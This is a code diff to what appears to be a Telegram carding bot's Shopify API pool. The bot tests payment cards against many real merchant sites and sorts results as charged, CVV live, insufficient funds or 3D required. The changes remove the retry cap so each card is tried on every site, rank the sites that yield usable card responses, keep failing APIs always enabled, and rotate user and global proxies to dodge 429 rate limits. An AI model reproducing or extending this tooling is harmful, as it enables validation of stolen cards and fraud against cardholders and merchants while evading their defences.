+                # Also remove from performance tracking
+                if site in self.site_performance:
+                    del self.site_performance[site]
+                # Invalidate cache
+                self.good_sites_cache_time = 0
+        
+        # Auto-save every 50 checks
+        if stats['total_checks'] % 50 == 0:
+            self._save_site_performance()
+    
+    def _get_good_sites_prioritized(self) -> list:
+        """
+        Get list of sites that have returned good responses (CARD_DECLINED, OTP_REQUIRED, etc.)
+        Sorted by: most good responses first, then by lowest total checks
+        """
+        # Check cache
+        if self.good_sites_cache and (time.time() - self.good_sites_cache_time) < self.good_sites_cache_ttl:
+            return self.good_sites_cache
+        
+        # Build list of good sites
+        good_sites = []
+        for site, stats in self.site_performance.items():
+            if stats.get('is_good', False) and stats.get('good_responses', 0) > 0:
+                # Check if site is still in rotation
+                if site in autosopi_site_manager.sites:
+                    good_sites.append({
+                        'site': site,
+                        'score': stats.get('good_responses', 0) * 10 - stats.get('total_checks', 0) * 0.5,
+                        'good_count': stats.get('good_responses', 0),
+                        'total_checks': stats.get('total_checks', 0),
+                        'last_time': stats.get('last_time', 0)
+                    })
+        
+        # Sort by: good_count (desc), then total_checks (asc), then last_time (desc)
+        good_sites.sort(key=lambda x: (-x['good_count'], x['total_checks'], -x['last_time']))
+        
+        # Extract just site names
+        self.good_sites_cache = [s['site'] for s in good_sites]
+        self.good_sites_cache_time = time.time()
+        
+        print(f"📊 [SITE PRIORITY] Found {len(self.good_sites_cache)} good sites")
+        if self.good_sites_cache:
+            print(f"   Top sites: {self.good_sites_cache[:5]}")
+        
+        return self.good_sites_cache
+    
+    def _get_next_site_prioritized(self, tried_sites: list) -> Optional[str]:
+        """
+        Get the next site with priority for GOOD sites
+        Falls back to normal rotation if no good sites available
+        """
+        # First, try to get a good site that hasn't been tried yet
+        good_sites = self._get_good_sites_prioritized()
+        
+        for site in good_sites:
+            if site not in tried_sites:
+                print(f"🌟 [SITE SELECTION] Using prioritized GOOD site: {site}")
+                return site
+        
+        # No good sites available or all tried - use normal rotation
+        # Get ALL sites from autosopi manager
+        all_sites = autosopi_site_manager.sites.copy()
+        
+        # Try each site that hasn't been tried yet
+        for site in all_sites:
+            if site not in tried_sites:
+                print(f"🔄 [SITE SELECTION] Using site: {site}")
+                return site
+        
+        # All sites tried - return None
+        return None
     
     async def get_session(self):
         """Get or create HTTP session"""
@@ -12219,18 +11617,14 @@ class ShopifyAPIPool:
     async def get_next_api(self) -> dict:
         """
         Get next API using weighted round-robin
-        Returns API configuration dict
+        ALL APIs are always enabled - NEVER disable
         """
         async with self._lock:
-            # Filter enabled APIs
-            enabled_apis = [api for api in self.apis if api.get("enabled", True)]
+            # ALL APIs are always enabled - never disable
+            for api in self.apis:
+                api["enabled"] = True
             
-            if not enabled_apis:
-                # If all APIs are disabled, re-enable them
-                print("⚠️ All APIs disabled! Re-enabling all...")
-                for api in self.apis:
-                    api["enabled"] = True
-                enabled_apis = self.apis.copy()
+            enabled_apis = self.apis.copy()
             
             # Calculate total weight
             total_weight = sum(api.get("weight", 1) for api in enabled_apis)
@@ -12258,8 +11652,11 @@ class ShopifyAPIPool:
             
             return selected.copy()
     
-    def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False):
-        """Mark API call result for statistics and adaptive weighting"""
+    def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False, is_rate_limit: bool = False):
+        """
+        Mark API call result for statistics and adaptive weighting
+        APIs are NEVER disabled - only weights are adjusted
+        """
         for api in self.apis:
             if api["name"] == api_name:
                 if success:
@@ -12278,10 +11675,9 @@ class ShopifyAPIPool:
                 if total_calls > 0:
                     api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
                 
-                # Auto-disable if 5 consecutive failures with no successes
-                if api.get("fail_count", 0) >= 5 and api.get("success_count", 0) == 0:
-                    print(f"⚠️ Disabling API {api_name} due to 5 consecutive failures")
-                    api["enabled"] = False
+                # ============ REMOVED: Auto-disable logic ============
+                # APIs are NEVER disabled, regardless of failures
+                # Only weights are adjusted
                 break
         
         # Update stats dict
@@ -12292,6 +11688,8 @@ class ShopifyAPIPool:
             else:
                 if is_retryable:
                     self.api_stats[api_name]["retryable"] += 1
+                elif is_rate_limit:
+                    self.api_stats[api_name]["rate_limited"] += 1
                 else:
                     self.api_stats[api_name]["failed"] += 1
             
@@ -12304,27 +11702,52 @@ class ShopifyAPIPool:
         """Create a unique key for a card + site combination"""
         return f"{card}|{site}"
     
+    def _is_good_response(self, response_text: str) -> bool:
+        """Check if response indicates a GOOD site (working properly)"""
+        response_upper = response_text.upper()
+        good_indicators = [
+            "CARD_DECLINED", "OTP_REQUIRED", "ORDER_PLACED", "3D REQUIRED",
+            "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
+            "ORDER_PLACED", "CHARGED", "ORDER COMPLETED",
+            "INSUFFICIENT_FUNDS", "INSUFFICIENT", "FUNDS"
+        ]
+        return any(indicator in response_upper for indicator in good_indicators)
+    
     async def check_card_with_pool(self, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """
         Check a card using the best available API from the pool
-        MAX 8 TOTAL ATTEMPTS per card
+        RETRY UNTIL ALL SITES ARE EXHAUSTED (no hard limit)
         PROXY ROTATION on retry to avoid rate limiting
-        GOOD sites (CARD_DECLINED/OTP_REQUIRED) are NEVER removed
+        GOOD sites are prioritized for future cards
+        429 errors are tracked - sites with 20+ 429 errors are removed
         """
-        max_attempts = 30  # Reduced from 20 to 8 for efficiency
-        tried_apis = []
-        tried_sites = [site]
-        tried_proxies = [proxy]  # Track tried proxies
+        tried_sites = []  # Start empty - we'll track all sites tried
+        tried_proxies = [proxy] if proxy else []  # Track tried proxies
+        rate_limit_count = 0  # Track consecutive 429 errors
+        good_responses = 0  # Track good responses for this card
+        attempt = 0
         
         # Get user's working proxies for rotation
         user_proxies = []
+        
         if user_id and user_id in autosopi_proxy_tracker.working_proxies:
             user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
-            # Remove the current proxy from the list if it's causing issues
+            
             if proxy in user_proxies and len(user_proxies) > 1:
                 user_proxies = [p for p in user_proxies if p != proxy]
+                
         
-        # Print proxy rotation info
+        global_proxies = []
+        if global_proxy_pool.enabled and global_proxy_pool.proxies:
+            global_proxies = global_proxy_pool.proxies.copy()
+            print(f"🌐 [Pool] Using {len(global_proxies)} global proxies")
+        else:
+            print(f"⚠️ [Pool] No global proxies available, using direct connection")
+            
+            if not user_proxies and global_proxies:
+                user_proxies = global_proxies
+                print(f"🌐 [Pool] Using global proxies as fallback: {len(user_proxies)}")
+                
         if user_proxies:
             print(f"🔄 [PROXY ROTATION] {len(user_proxies)} working proxies available for rotation")
             for i, p in enumerate(user_proxies[:5]):
@@ -12332,68 +11755,90 @@ class ShopifyAPIPool:
             if len(user_proxies) > 5:
                 print(f"   ... and {len(user_proxies) - 5} more")
         
-        for attempt in range(max_attempts):
+        # ============ FIX: Get ALL sites from autosopi manager ============
+        all_sites = autosopi_site_manager.sites.copy()
+        total_sites = len(all_sites)
+        
+        print(f"📊 [API POOL] Total sites available: {total_sites}")
+        
+        # Start with the initial site
+        current_site = site
+        tried_sites.append(site)
+        
+        while True:
+            attempt += 1
+            
+            # ============ FIX: Check if we've tried ALL sites ============
+            if len(tried_sites) >= total_sites:
+                print(f"❌ [API POOL] All {total_sites} sites have been tried. Stopping.")
+                print(f"📊 Sites tried: {len(tried_sites)}/{total_sites}")
+                break
+            
             # Get a new API for each attempt
             api = await self.get_next_api()
             api_name = api["name"]
             
-            # Skip if we already tried this API in this session
-            if api_name in tried_apis:
-                print(f"⏭️ [API POOL] Already tried {api_name}, skipping...")
-                continue
-            tried_apis.append(api_name)
+            # ============ FIX: Get next site that hasn't been tried ============
+            # First, try to get a good site that hasn't been tried
+            new_site = None
+            good_sites = self._get_good_sites_prioritized()
             
-            # For attempts after first, try a different site AND proxy
-            current_site = site
+            for site in good_sites:
+                if site not in tried_sites:
+                    new_site = site
+                    print(f"🌟 [SITE SELECTION] Using prioritized GOOD site: {site}")
+                    break
+            
+            # If no good sites left, try any untested site
+            if not new_site:
+                for site in all_sites:
+                    if site not in tried_sites:
+                        new_site = site
+                        print(f"🔄 [SITE SELECTION] Using untested site: {site}")
+                        break
+            
+            # If we found a new site, use it
+            if new_site:
+                current_site = new_site
+                tried_sites.append(new_site)
+                print(f"🔄 [ATTEMPT #{attempt}] Trying site: {current_site}")
+            else:
+                # All sites tried - break
+                print(f"❌ [API POOL] No untested sites found. Stopping.")
+                break
+            
+            # ============ PROXY ROTATION ON RETRY ============
             current_proxy = proxy
-            
-            if attempt >= 1:
-                # Try a different site for retry
-                if hasattr(autosopi_site_manager, 'get_next_site_weighted'):
-                    new_site = autosopi_site_manager.get_next_site_weighted()
-                else:
-                    new_site = autosopi_site_manager.get_next_site()
-                
-                if new_site and new_site not in tried_sites:
-                    current_site = new_site
-                    tried_sites.append(new_site)
-                    print(f"🔄 [RETRY #{attempt+1}] Trying different site: {current_site}")
-                
-                # ============ PROXY ROTATION ON RETRY ============
-                if user_proxies:
-                    # Find a proxy we haven't tried yet
-                    found_new_proxy = False
+            if user_proxies:
+                if attempt > 1:
+                    found_new_proxy = False 
                     for p in user_proxies:
-                        # Check if proxy is rate-limited
-                        if hasattr(autosopi_proxy_tracker, 'is_rate_limited'):
-                            if autosopi_proxy_tracker.is_rate_limited(user_id, p):
-                                print(f"⏭️ [PROXY] Skipping rate-limited proxy: {mask_proxy(p)}")
-                                continue
                         if p not in tried_proxies:
                             current_proxy = p
                             tried_proxies.append(p)
-                            print(f"🔄 [RETRY #{attempt+1}] Rotating to NEW proxy: {mask_proxy(current_proxy)}")
-                            found_new_proxy = True
+                            print(f"🔄 [ATTEMPT #{attempt}] Rotating to NEW global proxy: {mask_proxy(current_proxy)}")
+                            
                             break
+                
+                # If all proxies tried, recycle one
+                if not found_new_proxy and user_proxies:
+                    # Try to find any proxy not currently rate-limited
+                    for p in user_proxies:
+                        if hasattr(autosopi_proxy_tracker, 'is_rate_limited'):
+                            if not autosopi_proxy_tracker.is_rate_limited(user_id, p):
+                                current_proxy = p
+                                tried_proxies.append(p)
+                                print(f"🔄 [ATTEMPT #{attempt}] Recycling proxy: {mask_proxy(current_proxy)}")
+                                found_new_proxy = True
+                                break
                     
-                    # If all proxies tried, recycle one
-                    if not found_new_proxy and user_proxies:
-                        # Try to find any proxy not currently rate-limited
-                        for p in user_proxies:
-                            if hasattr(autosopi_proxy_tracker, 'is_rate_limited'):
-                                if not autosopi_proxy_tracker.is_rate_limited(user_id, p):
-                                    current_proxy = p
-                                    tried_proxies.append(p)
-                                    print(f"🔄 [RETRY #{attempt+1}] Recycling proxy: {mask_proxy(current_proxy)}")
-                                    found_new_proxy = True
-                                    break
-                        
-                        # Last resort - use any proxy
-                        if not found_new_proxy:
-                            current_proxy = user_proxies[attempt % len(user_proxies)]
-                            print(f"🔄 [RETRY #{attempt+1}] Forcing proxy rotation: {mask_proxy(current_proxy)}")
+                    # Last resort - use any proxy
+                    if not found_new_proxy:
+                        current_proxy = user_proxies[attempt % len(user_proxies)]
+                        print(f"🔄 [ATTEMPT #{attempt}] Forcing proxy rotation: {mask_proxy(current_proxy)}")
             
-            print(f"\n🔍 [API POOL] Attempt {attempt + 1}/{max_attempts} using: {api_name} (Site: {current_site})")
+            print(f"\n🔍 [API POOL] Attempt {attempt} using: {api_name} (Site: {current_site})")
+            print(f"📊 Sites tried: {len(tried_sites)}/{total_sites}")
             
             start_time = time.time()
             
@@ -12408,7 +11853,8 @@ class ShopifyAPIPool:
                 
                 # Check if site was removed (from _make_api_request)
                 if result.get("site_removed", False):
-                    print(f"🗑️ [API POOL] Site {current_site} was removed due to error, retrying with new site")
+                    print(f"🗑️ [API POOL] Site {current_site} was removed due to error")
+                    # Remove from tried_sites so we don't count it
                     if current_site in tried_sites:
                         tried_sites.remove(current_site)
                     self.mark_api_result(api_name, False, elapsed, True)
@@ -12418,32 +11864,50 @@ class ShopifyAPIPool:
                 response_upper = response_text.upper()
                 status_category = result.get("status_category", "")
                 
-                # ============ CHECK IF SITE IS GOOD (PROTECTED) ============
-                # GOOD indicators - sites that return these are NEVER removed
-                good_indicators = [
-                    "CARD_DECLINED", "OTP_REQUIRED", "ORDER_PLACED", "3D REQUIRED",
-                    "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
-                    "ORDER_PLACED", "CHARGED", "ORDER COMPLETED"
-                ]
-                is_good_site = any(indicator in response_upper for indicator in good_indicators)
+                # ============ CHECK FOR GOOD RESPONSE ============
+                is_good_response = self._is_good_response(response_text)
                 
-                if is_good_site:
-                    # Record as GOOD site
-                    try:
-                        price_val = float(result.get("price", 0))
-                    except (ValueError, TypeError):
-                        price_val = 0
-                        
-                    site_quality_tracker.record_response(current_site, response_text, status_category, price_val)
-                    print(f"🌟 [SITE PROTECTION] Recorded GOOD response for {current_site}")
+                if is_good_response:
+                    good_responses += 1
+                    print(f"🌟 [GOOD RESPONSE] {current_site} returned good response #{good_responses}")
+                    # Update site performance
+                    self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
                     
                     # Mark proxy as working if it returned a good response
                     if current_proxy and user_id:
                         if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
                             autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
                 
+                # ============ CHECK FOR 429 RATE LIMIT ============
+                is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text
+                
+                if is_rate_limit:
+                    rate_limit_count += 1
+                    print(f"🚫 [RATE LIMIT] 429 detected! (count: {rate_limit_count})")
+                    
+                    # Check if this site is GOOD - if yes, don't count it as rate-limited
+                    if site_quality_tracker.is_good_site(current_site) or self.site_performance.get(current_site, {}).get('is_good', False):
+                        print(f"🌟 [SITE PROTECTION] Site {current_site} is GOOD - NOT counting this 429 against it")
+                    else:
+                        # Update site performance with rate limit (only for non-GOOD sites)
+                        self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=True)
+                    
+                    # Mark proxy as rate limited
+                    if current_proxy and user_id:
+                        if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
+                            autosopi_proxy_tracker.mark_rate_limited(user_id, current_proxy, 120)
+                        if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
+                            autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
+                    
+                    # Continue to next site
+                    self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
+                    print(f"🔄 [API POOL] 429 detected, trying next site...")
+                    continue
+                
+                # Reset rate limit counter on successful response
+                rate_limit_count = 0
+                
                 # ============ CHECK FOR SITE REMOVAL ERRORS ============
-                # ONLY remove if site is NOT GOOD
                 is_site_removal_error = False
                 for removal_error in SITE_REMOVAL_ERRORS:
                     if removal_error.upper() in response_upper:
@@ -12453,30 +11917,16 @@ class ShopifyAPIPool:
                 
                 if is_site_removal_error:
                     # Check if site is GOOD - if yes, DON'T remove
-                    if site_quality_tracker.is_good_site(current_site):
-                        print(f"🌟 [SITE PROTECTION] Site {current_site} is GOOD - NOT removing despite error: {response_text[:50]}")
+                    if site_quality_tracker.is_good_site(current_site) or self.site_performance.get(current_site, {}).get('is_good', False):
+                        print(f"🌟 [SITE PROTECTION] Site {current_site} is GOOD - NOT removing despite error")
                     else:
-                        print(f"🗑️ [SITE REMOVAL] Removing bad site: {current_site} - {response_text[:50]}")
+                        print(f"🗑️ [SITE REMOVAL] Removing bad site: {current_site}")
                         autosopi_site_manager.remove_site(current_site, OWNER_ID)
+                        if current_site in self.site_performance:
+                            del self.site_performance[current_site]
+                        self.good_sites_cache_time = 0
                         self.mark_api_result(api_name, False, elapsed, True)
-                        
-                        if attempt < max_attempts - 1:
-                            print(f"🔄 [API POOL] Site issue, retrying with different site")
-                            continue
-                
-                # ============ CHECK FOR RATE LIMIT (429) - MARK PROXY ============
-                if "429" in response_text or "Site Error! Status: 429" in response_text:
-                    print(f"🚫 [RATE LIMIT] Rate limit detected on proxy: {mask_proxy(current_proxy)}")
-                    if current_proxy and user_id:
-                        if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
-                            autosopi_proxy_tracker.mark_rate_limited(user_id, current_proxy, 120)
-                        # Also mark as failure so it's removed from working pool
-                        if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
-                            autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
-                    
-                    if attempt < max_attempts - 1:
-                        print(f"🔄 [API POOL] Rate limit, retrying with different proxy")
-                        continue
+                    continue
                 
                 # ============ REAL CARD DECLINE PATTERNS (FINAL, NO RETRY) ============
                 real_decline_patterns = [
@@ -12494,7 +11944,7 @@ class ShopifyAPIPool:
                 if is_real_decline:
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
-                    result["api_attempt"] = attempt + 1
+                    result["api_attempt"] = attempt
                     result["status"] = "declined"
                     result["status_category"] = "declined"
                     result["status_display"] = "❌ DECLINED"
@@ -12505,7 +11955,7 @@ class ShopifyAPIPool:
                 if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
-                    result["api_attempt"] = attempt + 1
+                    result["api_attempt"] = attempt
                     result["status_category"] = "charged"
                     result["status_display"] = "🔥 CHARGED 🔥"
                     print(f"🔥 [API POOL] CHARGED detected!")
@@ -12515,7 +11965,7 @@ class ShopifyAPIPool:
                 if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
-                    result["api_attempt"] = attempt + 1
+                    result["api_attempt"] = attempt
                     result["status_category"] = "approved"
                     result["status_display"] = "🔐 3D REQUIRED"
                     print(f"🔐 [API POOL] 3D REQUIRED detected!")
@@ -12525,7 +11975,7 @@ class ShopifyAPIPool:
                 if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
-                    result["api_attempt"] = attempt + 1
+                    result["api_attempt"] = attempt
                     result["status_category"] = "approved"
                     result["status_display"] = "💰 INSUFFICIENT FUNDS"
                     print(f"💰 [API POOL] INSUFFICIENT FUNDS detected!")
@@ -12535,7 +11985,7 @@ class ShopifyAPIPool:
                 if "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
-                    result["api_attempt"] = attempt + 1
+                    result["api_attempt"] = attempt
                     result["status_category"] = "approved"
                     result["status_display"] = "✅ CVV LIVE"
                     print(f"✅ [API POOL] CVV LIVE detected!")
@@ -12563,42 +12013,32 @@ class ShopifyAPIPool:
                 
                 is_retryable_error = any(pattern in response_upper for pattern in retryable_patterns)
                 
-                if is_retryable_error and attempt < max_attempts - 1:
-                    print(f"🔄 [API POOL] Retryable error, will try different API/site/proxy")
+                if is_retryable_error:
+                    print(f"🔄 [API POOL] Retryable error: {response_text[:100]}")
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 else:
-                    # Not retryable or last attempt - treat as declined
+                    # Not retryable - treat as declined
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["status"] = "declined"
                     result["status_category"] = "declined"
                     result["status_display"] = "❌ DECLINED"
-                    print(f"❌ [API POOL] Card DECLINED on attempt {attempt + 1}")
+                    print(f"❌ [API POOL] Card DECLINED on attempt {attempt}")
                     return result
                 
             except Exception as e:
                 elapsed = time.time() - start_time
                 self.mark_api_result(api_name, False, elapsed, True)
                 print(f"❌ [API POOL] {api_name} error: {str(e)[:100]}")
-                if attempt == max_attempts - 1:
-                    return {
-                        "status": "declined",
-                        "result": "DECLINED",
-                        "message": "Card declined after retries",
-                        "status_display": "❌ DECLINED",
-                        "status_category": "declined",
-                        "elapsed": elapsed,
-                        "price": "0.00",
-                        "gateway": "Shopify Payments"
-                    }
+                # Continue to next site on error
                 continue
         
-        # All retries exhausted
-        print(f"❌ [API POOL] All {max_attempts} attempts failed for card {card[:20]}...")
+        # All sites exhausted
+        print(f"❌ [API POOL] All {total_sites} sites exhausted for card {card[:20]}...")
         return {
             "status": "declined",
             "result": "DECLINED",
-            "message": "Card declined",
+            "message": "Card declined - all sites failed",
             "status_display": "❌ DECLINED",
             "status_category": "declined",
             "elapsed": 0,
@@ -12609,6 +12049,7 @@ class ShopifyAPIPool:
     async def _make_api_request(self, api: dict, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """Make request to a specific API with site quality tracking"""
         
+
         # Parse card
         parts = card.split('|')
         if len(parts) != 4:
@@ -12680,11 +12121,15 @@ class ShopifyAPIPool:
                 print(f"⚠️ JSON parse error: {e}")
                 # Check if response is HTML (site error page)
                 if response.text and ('<html' in response.text[:100] or '<!DOCTYPE' in response.text[:100]):
-                    if site_quality_tracker.is_good_site(site_clean):
+                    if site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False):
                         print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT removing despite HTML error")
                     else:
                         print(f"🗑️ HTML response (site error) - Removing site: {site_clean}")
                         autosopi_site_manager.remove_site(site_clean, OWNER_ID)
+                        # Also remove from performance tracking
+                        if site_clean in self.site_performance:
+                            del self.site_performance[site_clean]
+                        self.good_sites_cache_time = 0
                         site_removed = True
                     return {
                         "status": "error",
@@ -12718,15 +12163,31 @@ class ShopifyAPIPool:
                 if proxy and user_id:
                     if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
                         autosopi_proxy_tracker.mark_rate_limited(user_id, proxy, 120)
-                    # Also record as a proxy result (failure due to rate limit)
                     if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
                         autosopi_proxy_tracker.record_proxy_result(user_id, proxy, response_text, elapsed)
+                
+                # Return with special flag for 429
+                return {
+                    "status": "error",
+                    "result": "RATE_LIMIT_429",
+                    "message": response_text,
+                    "status_display": "⚠️ RATE LIMIT (429)",
+                    "status_category": "retryable",
+                    "elapsed": elapsed,
+                    "price": str(price),
+                    "gateway": gateway,
+                    "site": site_clean,
+                    "proxy_used": proxy,
+                    "api_name": api["name"],
+                    "is_rate_limit": True
+                }
             
             # ============ RECORD GOOD SITE RESPONSES ============
             good_indicators = [
                 "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
                 "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
-                "ORDER_PLACED", "CHARGED", "ORDER COMPLETED"
+                "ORDER_PLACED", "CHARGED", "ORDER COMPLETED",
+                "INSUFFICIENT_FUNDS", "INSUFFICIENT", "FUNDS"
             ]
             is_good_response = any(indicator in response_upper for indicator in good_indicators)
             
@@ -12736,17 +12197,19 @@ class ShopifyAPIPool:
                 except (ValueError, TypeError):
                     price_float = 0.00
                 site_quality_tracker.record_response(site_clean, response_text, "good", price_float)
+                self._update_site_performance(site_clean, response_text, is_good=True, is_rate_limit=False)
             
             # ============ CHECK FOR SITE REMOVAL ERRORS ============
-            # ONLY remove if site is NOT GOOD
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
-                    # Check if site is GOOD - if yes, DON'T remove
-                    if site_quality_tracker.is_good_site(site_clean):
+                    if site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False):
                         print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT removing despite error: {removal_error}")
                     else:
                         print(f"🗑️ [SITE REMOVAL] {removal_error} detected for site {site_clean}")
                         autosopi_site_manager.remove_site(site_clean, OWNER_ID)
+                        if site_clean in self.site_performance:
+                            del self.site_performance[site_clean]
+                        self.good_sites_cache_time = 0
                         site_removed = True
                     return {
                         "status": "error",
@@ -12781,6 +12244,7 @@ class ShopifyAPIPool:
             if is_real_decline:
                 print(f"❌ [API] Card DECLINED - real decline")
                 site_quality_tracker.record_response(site_clean, response_text, "declined", price_float)
+                self._update_site_performance(site_clean, response_text, is_good=False, is_rate_limit=False)
                 return {
                     "status": "declined",
                     "result": response_text,
@@ -12863,7 +12327,7 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ RETRYABLE ERRORS (try different site/api/proxy) ============
+            # ============ RETRYABLE ERRORS ============
             retryable_patterns = [
                 "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
                 "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
@@ -12937,6 +12401,38 @@ class ShopifyAPIPool:
                 "elapsed": 0
             }
     
+    def get_site_performance_stats(self) -> str:
+        """Get formatted site performance statistics"""
+        if not self.site_performance:
+            return "📊 No site performance data available."
+        
+        result = "📊 <b>Site Performance Statistics</b>\n\n"
+        
+        # Sort by good responses (desc)
+        sorted_sites = sorted(
+            self.site_performance.items(),
+            key=lambda x: (x[1].get('good_responses', 0), -x[1].get('rate_limits', 0)),
+            reverse=True
+        )
+        
+        for site, stats in sorted_sites[:20]:
+            good = stats.get('good_responses', 0)
+            rate_limits = stats.get('rate_limits', 0)
+            total = stats.get('total_checks', 0)
+            is_good = stats.get('is_good', False)
+            
+            status = "🌟 GOOD" if is_good else "📌 NORMAL"
+            result += f"{status} <code>{site}</code>\n"
+            result += f"   ├─ Good Responses: {good}\n"
+            result += f"   ├─ Rate Limits (429): {rate_limits}\n"
+            result += f"   ├─ Total Checks: {total}\n"
+            result += f"   └─ Last Response: {stats.get('last_response', 'N/A')[:50]}\n\n"
+        
+        if len(sorted_sites) > 20:
+            result += f"... and {len(sorted_sites) - 20} more sites\n"
+        
+        return result
+    
     def get_stats(self) -> str:
         """Get formatted statistics for all APIs"""
         result = "📊 <b>Shopify API Pool Statistics</b>\n\n"
@@ -12944,10 +12440,11 @@ class ShopifyAPIPool:
         for api in self.apis:
             name = api["name"]
             stats = self.api_stats.get(name, {})
-            enabled = "✅" if api.get("enabled", True) else "❌"
+            enabled = "✅"  # Always enabled
             total = stats.get('total_requests', 0)
             successful = stats.get('successful', 0)
             retryable = stats.get('retryable', 0)
+            rate_limited = stats.get('rate_limited', 0)
             failed = stats.get('failed', 0)
             success_rate = (successful / max(total, 1)) * 100
             
@@ -12956,9 +12453,13 @@ class ShopifyAPIPool:
             result += f"   ├─ Success Rate: {success_rate:.1f}%\n"
             result += f"   ├─ Successful: {successful}\n"
             result += f"   ├─ Retryable Errors: {retryable}\n"
+            result += f"   ├─ Rate Limited (429): {rate_limited}\n"
             result += f"   ├─ Failed: {failed}\n"
             result += f"   ├─ Avg Time: {stats.get('avg_response_time', 0):.2f}s\n"
             result += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
+        
+        # Add site performance summary
+        result += "\n" + self.get_site_performance_stats()
         
         return result
     
@@ -12967,8 +12468,6 @@ class ShopifyAPIPool:
         if self.session:
             await self.session.aclose()
             self.session = None
-    
-
 
 # Create global instance
 shopify_api_pool = ShopifyAPIPool()
@@ -12983,6 +12482,13 @@ async def aumc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = update.effective_user.id
     message = update.effective_message
+    
+    has_proxies, proxy_status = await check_user_has_proxies(user_id, update, context)
+    
+    if not has_proxies:
+        warning_msg = get_proxy_warning_message(user_id)
+        await message.reply_text(warning_msg, parse_mode=ParseMode.HTML)
+        return    
     
     # Check if user already has an active session
     if user_id in autosopi_active_tasks:
@@ -17513,8 +17019,18 @@ class UserManager:
         return self.TIERS[tier]["concurrency"]
     
     def can_use_proxy(self, user_id: int) -> bool:
-        tier = self.get_tier(user_id)
-        return self.TIERS[tier]["can_use_proxy"]
+     """Check if user can use proxies (personal or global)"""
+     tier = self.get_tier(user_id)
+    
+     # If user tier allows proxies, they can use them
+     if self.TIERS[tier]["can_use_proxy"]:
+        return True
+    
+     # Even if tier doesn't allow personal proxies, they can use global
+     if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        return True
+    
+     return False
     
     # ============ WORKER MODE METHODS ============
     
@@ -21031,27 +20547,7 @@ class GlobalProxyPool:
 
 
 # ============ GET PROXY FUNCTION ============
-def get_proxy_for_user(user_id: int, gateway: str = 'default') -> Optional[str]:
-    """
-    Get a proxy for a user.
-    Priority: User's personal proxy > Global proxy pool
-    """
-    # Check if user has personal proxies
-    if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
-        # Use user's personal proxy
-        return proxy_manager.get_next_proxy_for_user(user_id)
-    
-    # Fallback to global proxy pool
-    if global_proxy_pool.enabled and global_proxy_pool.proxies:
-        proxy = global_proxy_pool.get_next_proxy()
-        if proxy:
-            print(f"🌐 [Global Proxy] Using global proxy: {mask_proxy(proxy)}")
-            return proxy
-        else:
-            print(f"⚠️ [Global Proxy] No proxies available in pool")
-    
-    print(f"⚠️ [Proxy] No proxy available, using direct connection")
-    return None
+
 
 
 async def get_proxy_async(user_id: int, gateway: str = 'default') -> Optional[str]:
@@ -21331,51 +20827,234 @@ async def globalproxy_handle_file(update: Update, context: ContextTypes.DEFAULT_
 global_proxy_pool = GlobalProxyPool()
 
 
-# ============ MODIFY EXISTING FUNCTIONS ============
-
-# Update the get_proxy_for_user function to use global pool as fallback
-# Replace your existing get_proxy_for_user with this:
-
 def get_proxy_for_user(user_id: int, gateway: str = 'default') -> Optional[str]:
     """
     Get a proxy for a user.
-    Priority: User's personal proxy > Global proxy pool
+    Priority: 
+    1. User's personal proxies
+    2. Global proxy pool (fallback)
+    3. No proxy (direct connection)
     """
-    # Check if user has personal proxies
+    # ============ PRIORITY 1: User's personal proxies ============
     if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
         # Use user's personal proxy
-        return proxy_manager.get_next_proxy_for_user(user_id)
